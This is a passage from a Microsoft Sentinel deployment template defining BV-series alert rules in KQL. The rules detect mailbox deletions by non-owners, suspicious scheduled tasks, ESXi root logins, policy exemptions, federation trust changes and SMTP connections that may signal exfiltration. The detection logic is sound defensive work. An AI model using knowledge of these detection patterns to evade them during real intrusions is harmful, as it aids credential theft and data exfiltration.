          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIP2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIP1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11300')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11300')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11300: [RBA] O365 - Mailbox Item Deleted By Non-Owner",
          "description": "This alert identifies items that are deleted from a mailbox by a non-owner MITRE: T1078,T1114 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nOfficeActivity\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where OfficeWorkload =~ 'Exchange'\n| where Operation in~ ('HardDelete', 'SoftDelete')\n| extend \n    bv_src_user = tolower(UserId)\n    , bv_dest_user = tolower(MailboxOwnerUPN)\n    , bv_dest_user_normalized = bv_cim_normalize_username(tolower(MailboxOwnerUPN))\n    , bv_affected_item = tostring(parse_json(tostring(parse_json(AffectedItems)[0].ParentFolder)).Path)\n| where bv_src_user <> bv_dest_user          \n| mv-apply e = BV11300_CONFIGURATION.EXCLUSION on (\n    extend keys = bag_keys(e)\n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_src_user_excluded = iff((bv_src_user contains e.bv_src_user or tolower(e.bv_src_user) contains bv_src_user) and isnotempty(e.bv_src_user), 1, 0)\n    | extend bv_affected_item_excluded = iff(bv_affected_item contains e.bv_affected_item and isnotempty(e.bv_affected_item), 1, 0)\n    | extend bv_dest_user_excluded = iff((bv_dest_user contains e.bv_dest_user or tolower(e.bv_dest_user) contains bv_dest_user) and isnotempty(e.bv_dest_user), 1, 0)\n    | extend excluded_count = \n            bv_src_user_excluded\n            + bv_dest_user_excluded\n            + bv_affected_item_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n| where not(ExcludedEvent)\n| summarize \n      bv_dest_user   = make_set(bv_dest_user, 20)\n      , bv_dest_user_normalized   = make_set(bv_dest_user_normalized, 20)\n      , bv_start_time = min(TimeGenerated)\n      , bv_end_time   = max(TimeGenerated)\n      , bv_event_count = count()\n      , bv_affected_item = make_set(bv_affected_item)\n    by \n      bv_src_user\n| extend VictimEntity = bv_dest_user_normalized\n| extend AttackerEntity = pack_array(bv_cim_normalize_username(bv_src_user))\n| extend ExtendedDescription = strcat(\n      'bv_src_user:', bv_src_user\n      , '\\nbv_dest_user: \\n* ', strcat_array(bv_dest_user, '\\n* ')\n      , '\\n\\nbv_affected_item: \\n* ', strcat_array(bv_affected_item, '\\n* ')\n)\n| project   \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_dest_user\n      , bv_event_count\n      , bv_affected_item\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV11300_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies items that are deleted from a mailbox by a non-owner\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1510')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1510')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1510: [RBA] Windows - Suspicious Scheduled Task Modification",
          "description": "This alerts every time a scheduled task is updated with suspicious parameters which might be indicative of initial or recurring execution of malicious code. MITRE: T1053 Category: Windows Security tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;  \nlet EventIDList = dynamic([4702]);\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});      \nlet exclusions = array_concat(global_config['EXCLUSION'], BV1510_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1510_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | extend bv_rule_version = '1.0.4587'\n| extend bv_rule_timestamp = '1702314347.0254593'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4587 bv_rule_timestamp: 1702314347.0254593'\n| project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | extend bv_rule_version = '1.0.4587'\n| extend bv_rule_timestamp = '1702314347.0254593'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4587 bv_rule_timestamp: 1702314347.0254593'\n| project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend test = k\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains 'true', true, false)\n};\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList) and SubjectUserName !endswith \"$\"\n| where EventData contains 'command'\n| extend Command = tolower(extract(@'<Data Name=\"TaskContentNew\">.*;Command&gt;(.*?)&lt;/Command&gt;.*</Data>', 1, EventData))\n| extend Argument = tolower(extract(@'<Data Name=\"TaskContentNew\">.*;Arguments&gt;(.*?)&lt;/Arguments&gt;.*</Data>', 1, EventData))\n| extend CmdPath = parse_path(replace_string(Command, '\"', ''))\n| extend DirectoryPath = tostring(CmdPath.DirectoryPath)\n    , Executable = tostring(CmdPath.Filename)\n| extend bv_file_name = extract(@'<Data Name=\"TaskName\">(?:.*\\\\)?(.+)</Data>', 1, EventData)\n| where Command has_any (BV1510_CONFIG.['SUSPICIOUS_DIR']) and Executable has_any (BV1510_CONFIG.['SUSPICIOUS_EXEC'])\n| extend bv_rule_version = '1.0.4587'\n| extend bv_rule_timestamp = '1702314347.0254593'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4587 bv_rule_timestamp: 1702314347.0254593'\n| project \n    bv_user = SubjectUserName\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n    , bv_raw = EventData\n    , bv_event_id = EventID\n    , bv_process_command_line = strcat(Command, ' ', Argument)\n    , bv_file_name\n| summarize bv_start_time = min(bv_start_time), bv_end_time = arg_max(bv_start_time, *), bv_event_count = count(), bv_process_command_line = make_set(bv_process_command_line, 10) by bv_user          \n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1510')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_src_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| extend bv_rule_version = '1.0.4587'\n| extend bv_rule_timestamp = '1702314347.0254593'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.4587 bv_rule_timestamp: 1702314347.0254593'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1053"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alerts every time a scheduled task is updated with suspicious parameters which might be indicative of initial or recurring execution of malicious code.\n\n{{ExtendedDescription}}\n\nMITRE: T1053\nCategory: Windows Security\ntag: RBA      \n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "RBAScore": "bv_alarm_rba_score",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-894')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-894')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-894: [Hygiene] ESXI - Root Login",
          "description": "This alert is triggered when the root user is used to authenticate to ESXI.\n\nIndividual user accounts should be used to authenticate to ESXI for auditing purposes. MITRE: T1110 Category: Vmware ESXi tag: Hygiene",
          "severity": "Informational",
          "enabled": false,
          "query": "let start_time = 15m;\nlet end_time = now();\nlet latency = 60m;\nbv_vmware_esxi\n| where TimeGenerated between (ago(start_time + latency) .. end_time)\n| where SyslogMessage has_all ('root', 'logged in')\n| extend SrcIpAddr = extract(@'root@(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})', 1, SyslogMessage)\n| project TimeGenerated, SrcIpAddr, Computer",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10535')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10535')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10535: [RBA] Azure Activity - Exemption Policy Creation",
          "description": "Identifies creation of a resouce policy exemption MITRE: T1562 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet end_time = now();\nAzureActivity\n| where TimeGenerated between (ago(start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where OperationNameValue contains 'Authorization/Policy'\n| extend bv_object = tostring(parse_json(tostring(parse_json(tostring(Properties_d.requestbody)).properties)).policyAssignmentId)\n| extend bv_change_action_ = extract(@'/(\\w*)$',1,OperationNameValue)\n| extend bv_change_action = case(bv_change_action_ == 'WRITE', 'modify', '')\n| extend bv_object_category = 'policy'\n| extend bv_object_attr_category = 'exemption'\n| extend \n    bv_src_ip = CallerIpAddress\n    , bv_src_user = Caller\n| where isnotempty(bv_object)\n| where bv_change_action =~ 'modify'\n| extend bv_object_attr_name = tostring(parse_json(tostring(parse_json(tostring(parse_json(Properties).requestbody)).properties)).displayName)\n| extend bv_object_attr_description = tostring(parse_json(tostring(parse_json(tostring(parse_json(Properties).requestbody)).properties)).description)\n| extend bv_object_attr_scope = tostring(parse_json(Properties).entity)\n| extend bv_object_attr = pack('name',bv_object_attr_name, 'description', bv_object_attr_description, 'scope', bv_object_attr_scope)\n| extend AttackerEntity = pack_array(bv_src_ip, bv_src_user)\n| extend ExtendedDescription = strcat(\n    'bv_src_user: ', bv_src_user\n    ,'\\nbv_src_ip: ', bv_src_ip\n    ,'\\nbv_object: ', bv_object\n    ,'\\nbv_object_attr_name: ', bv_object_attr_name\n    ,'\\nbv_object_attr_description: ', bv_object_attr_description\n    ,'\\nbv_object_attr_scope: ', bv_object_attr_scope\n    ,'\\nbv_object_category: ', bv_object_category\n    ,'\\nbv_object_attr_category: ', bv_object_attr_category\n)\n| project \n    bv_start_time = TimeGenerated\n    , bv_src_user\n    , bv_src_ip\n    , bv_object_category\n    , bv_object_attr_category\n    , bv_object\n    , bv_object_attr\n    , bv_change_action\n    , bv_vendor_action = OperationNameValue\n    , ExtendedDescription\n    , AttackerEntity\n    , RBAScore = 1",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Identifies creation of a resouce policy exemption\n\n\n  {{ExtendedDescription}}\n\n  MITRE: T1629\n  Category: Azure Activity\n  tag: RBA"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "AttackerEntity": "AttackerEntity"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-597')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-597')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-597: [RBA] Azure Activity - PaaS User Errors and Warnings",
          "description": "This alert is triggered when an user account has generated error or warning events on Storage Accounts during the last 24 hours. MITRE: T1078 Category: Azure Activity tag: RBA",
          "severity": "Informational",
          "enabled": false,
          "query": "let generated_lookback = 1d;\nAzureActivity\n| where TimeGenerated between (ago(generated_lookback) .. now())\n| where OperationNameValue startswith 'Microsoft.Storage'\n| where Level !~ 'Informational' and isnotempty(Level)\n| where Caller contains '@'\n| summarize arg_max(TimeGenerated, *) by Caller\n| project\n    TimeGenerated,\n    OperationNameValue,\n    Level,\n    ActivityStatusValue,\n    ActivitySubstatusValue,\n    AccountCustomEntity = Caller,\n    IPCustomEntity = CallerIpAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-120')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-120')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-120: [RBA] O365 - Mailbox Added or Removed",
          "description": "This alert identifies administrative operations for mailboxes creation and removal. MITRE: T1114 Category: Office 365 tag: RBA",
          "severity": "Informational",
          "enabled": false,
          "query": "OfficeActivity \n| where TimeGenerated >= ago(1d)\n| where Operation in ('New-Mailbox','Remove-Mailbox')\n| where tolower(UserId) matches regex tolower(MICROSOFT_OFFICE_OPERATIONS_ACCOUNTS) == false\n| extend parsedParameters = parse_json(Parameters) \n| extend UserName = parsedParameters[1].Value\n| extend UserIdentity = parsedParameters[0].Value\n| extend TargetUser = iff(UserIdentity <> '', UserIdentity, UserName)\n| extend bv_rule_version = '1.0.3778'\n| extend bv_rule_timestamp = '1689098872.6930664'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.3778 bv_rule_timestamp: 1689098872.6930664'\n| project TimeGenerated,  Admin=UserId, TargetUser, Operation, ClientIP, OfficeObjectId, bv_rule_version, bv_rule_timestamp, bv_rule_combined_string\n| extend ClientIP = extract('(.+?):',1,ClientIP)\n| extend AccountCustomEntity = Admin, IPCustomEntity = ClientIP",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies administrative operations for mailboxes creation and removal.\n\ntag: RBA\n\nCategory:Office 365\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-112')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-112')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-112: [SOC] Azure AD - Modified Domain Federation Trust Settings",
          "description": "This will alert when an user or application modifies the federation settings on the domain. For example, this alert will trigger when a new Active Directory Federated Service (ADFS) TrustedRealm object, such as a signing certificate, is added to the domain. Modification to domain federation settings should be rare. Confirm the added or modified target domain/URL is legitimate administrator behavior.   To understand why an authorized user may update settings for a federated domain in Office 365, Azure, or Intune, see: https://docs.microsoft.com/office365/troubleshoot/active-directory/update-federated-domain-office-365. For details on security realms that accept security tokens, see the ADFS Proxy Protocol (MS-ADFSPP) specification: https://docs.microsoft.com/openspecs/windows_protocols/ms-adfspp/e7b9ea73-1980-4318-96a6-da559486664b. For further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities. Tags: SolarWinds SUNBURST MITRE: T1484 Category: Azure AD tag: SOC",
          "severity": "High",
          "enabled": false,
          "query": "let start_time = 1h;\nlet latency = 1h;\nAuditLogs\n| where TimeGenerated between (ago(start_time+latency)..now()) and ingestion_time() > ago(start_time)\n| where OperationName =~ 'Set federation settings on domain'\n| extend targetDisplayName = tostring(TargetResources[0].displayName)\n| extend UserAgent = iff(AdditionalDetails[0].key == 'User-Agent',tostring(AdditionalDetails[0].value),'')\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend InitiatingIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), tostring(InitiatedBy.user.ipAddress), tostring(InitiatedBy.app.ipAddress))\n| extend ExtendedDescription = strcat('User account or application ', InitiatingUserOrApp, ' performed action ', OperationName, ' from IP address ', InitiatingIpAddress , ' on target ', targetDisplayName)     \n| project TimeGenerated, ExtendedDescription, OperationName, InitiatingUserOrApp, AADOperationType, targetDisplayName, Result, InitiatingIpAddress, UserAgent, CorrelationId, TenantId\n| extend bv_mapping_tag = InitiatingUserOrApp",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1484"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This will alert when an user or application modifies the federation settings on the domain.\n\n{{ExtendedDescription}}\n\nMITRE: T1484\nCategory: Azure AD\ntag: SOC"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingUserOrApp"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-114')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-114')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-114: [Hygiene] Palo Alto - Connections to unsanctioned SMTP servers",
          "description": "This alert identifies internal hosts with an unusual amount of outbound allowed connections. This may indicate a data exfiltration or an otherwise compromised host. MITRE: T1071 Category: PaloAltoNetworks tag: Hygiene",
          "severity": "Low",
          "enabled": false,
